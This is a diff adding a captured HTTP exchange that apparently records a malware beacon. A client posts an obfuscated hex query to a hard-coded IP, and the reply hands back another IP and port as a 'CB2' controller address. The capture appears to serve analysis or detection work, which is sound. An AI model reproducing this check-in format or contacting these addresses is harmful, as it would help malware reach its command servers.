@@ -1,0 +1,18 @@
+POST /?e2bcb2b9b7a7f1bcb6b0b9b3a7f4bcb7b6b2a7f7bcb2b5b3b4a7e3bcb0b4b4b5b2b2b1a7e5bcb0a7f2bcb0b8b4b6b1b2b5a7e4bcc2bbddd6c8cfc5ced6d2ddd5c4ccd1ddf1ece0eab0b0eaf0afe4f9e4a7e6bce8efe8f581 HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+CB2: 1
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla
+Host: 219.145.198.122
+
+
+HTTP/1.1 200 OK
+Date: Thu, 11 Aug 2011 09:44:10 GMT
+Server: Apache/2.2.8 (Fedora) DAV/2 PHP/5.2.6 mod_ssl/2.2.8 OpenSSL/0.9.8g
+X-Powered-By: PHP/5.2.6
+Content-Length: 26
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+CB2=212.117.171.138:65500
